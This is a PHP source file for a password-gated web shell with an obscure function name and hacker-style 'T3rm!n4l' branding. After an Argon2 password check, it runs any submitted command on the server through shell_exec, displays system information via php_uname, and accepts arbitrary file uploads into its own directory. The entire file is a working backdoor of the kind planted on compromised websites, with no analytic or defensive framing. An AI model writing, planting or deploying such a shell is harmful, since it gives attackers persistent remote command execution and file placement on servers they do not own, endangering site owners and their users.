<?php
  function xroyp() {
session_start();
$BASE_DIR = __DIR__;
$errorMsg = '';
$storedPasswordHash = '$argon2id$v=19$m=256,t=20,p=10$a1BVS0RrMkRtaGtHOFJoMg$V3ylnkoL7B2iUqEFwGTTvAqH1zeX/SLnQIl5AQPvR3rNJX0lpdLEmHyzZpcVIWm5iEQ'; 
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if (password_verify($_POST['password'], $storedPasswordHash)) {
        $_SESSION['auth'] = true;
        $_SESSION['cwd'] = $BASE_DIR;
        header('Location: ' . $_SERVER['PHP_SELF'] . '?cmd=xroyp');
        exit;
    } else {
        $errorMsg = '❌ Incorrect password. Please try again.';
    }
}
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    echo '
    <center>
        <br><br>
        <form method="POST" class="login-form">
            <h2>4P1_L0g!n</h2>';
    if ($errorMsg) {
        echo '<p class="error">' . htmlspecialchars($errorMsg) . '</p>';
    }
    echo '  <label>Password:</label><br>
            <input type="password" name="password" required placeholder="Enter password"><br>
            <input type="submit" value="Login">
        </form>
    </center>
    <style>
    body {
        background-color: #000;
        color: #00ff00;
        font-family: monospace;
    }
    .login-form {
        background-color: #111;
        padding: 30px 40px;
        border: 2px solid #00ff00;
        border-radius: 8px;
        display: inline-block;
    }
    .login-form h2 {
        color: #00ffaa;
        margin-bottom: 20px;
        font-size: 24px;
    }
    .login-form label {
        display: block;
        margin-bottom: 8px;
    }
    .login-form input[type="password"] {
        padding: 8px;
        width: 200px;
        margin-bottom: 20px;
        border: 1px solid #00ff00;
        border-radius: 4px;
        background-color: #000;
        color: #00ff00;
        font-family: monospace;
        font-size: 16px;
    }
    .login-form input[type="password"]::placeholder {
        color: #00aa00;
    }
    .login-form input[type="submit"] {
        padding: 8px 20px;
        border: 1px solid #00ff00;
        border-radius: 4px;
        background-color: #000;
        color: #00ff00;
        font-family: monospace;
        cursor: pointer;
        font-size: 16px;
    }
    .login-form input[type="submit"]:hover {
        background-color: #00ff00;
        color: #000;
        transition: 0.2s;
    }
    .error {
        color: #ff4444;
        font-weight: bold;
        margin-bottom: 15px;
    }
    </style>
    ';
    exit;
}
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = $BASE_DIR;
}
if (isset($_POST['command'])) {
    $command = trim($_POST['command']);
    if ($command === '') exit('');
    if ($command === 'cd' || strpos($command, 'cd ') === 0) {
        if ($command === 'cd') {
            $_SESSION['cwd'] = $BASE_DIR;
            exit("📁 Home directory");
        }
        $target = trim(substr($command, 3));
        $newPath = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $target);
        if ($newPath === false || strpos($newPath, $BASE_DIR) !== 0) {
            exit("❌ Directory not allowed");
        }
        if (!is_dir($newPath)) {
            exit("❌ Not a directory");
        }
        $_SESSION['cwd'] = $newPath;
        exit("📁 Changed directory to: " . htmlspecialchars($newPath));
    }
    chdir($_SESSION['cwd']);
    $output = shell_exec(escapeshellcmd($command) . ' 2>&1');
    echo nl2br(htmlspecialchars($output));
    exit;
}
$uploadMessage = '';
if (isset($_FILES['file'])) {
    $uploadDir = __DIR__ . DIRECTORY_SEPARATOR;
    $uploadFile = $uploadDir . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
        $uploadMessage = "<b><font color='green'>Upload Ok !!!</font></b><br>";
    } else {
        $uploadMessage = "<b><font color='red'>Upload Failed !!!</font></b><br>";
    }
}
echo '
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>T3rm!n4l</title>
<style>
body { background: #000; color: #00ff00; font-family: monospace; padding: 10px; }
#terminal { border: 1px solid #00ff00; height: 360px; overflow-y: auto; padding: 10px; }
#input { width: 100%; background: #000; color: #00ff00; border: none; outline: none; font-family: monospace; font-size: 16px; }
.prompt { color: #00ffaa; }
input[type="submit"] { background:#000;color:#00ff00;border:1px solid #00ff00;cursor:pointer; }
</style>
</head>
<body>
<div id="terminal">
    <div>T3rm!n4l</div>
<div>
	<b>Server Info:</b>
	<br><font color="#4080FF" size="2">' . php_uname() . '</font></div><br>
</div>
<span class="prompt">/~$ </span>
<input type="text" id="input" autocomplete="off" autofocus>
<script>
const input = document.getElementById("input");
const terminal = document.getElementById("terminal");
input.addEventListener("keydown", function(e) {
    if (e.key === "Enter") {
        const command = input.value.trim();
        if (!command) return;
        terminal.innerHTML += `<div><span class="prompt">/~$ </span> ${command}</div>`;
        input.value = "";
        fetch("", {
            method: "POST",
            headers: {"Content-Type": "application/x-www-form-urlencoded"},
            body: "command=" + encodeURIComponent(command)
        })
        .then(res => res.text())
        .then(output => {
            terminal.innerHTML += `<div>${output}</div>`;
            terminal.scrollTop = terminal.scrollHeight;
        });
    }
});
</script>
<hr>
<center>
<h3>Upload File</h3>
<form method="post" enctype="multipart/form-data">
<input type="file" name="file" required>
<input type="submit" value="Upload">
</form>
' . $uploadMessage . '
</center>
</body>
</html>
';
}
xroyp();
?>
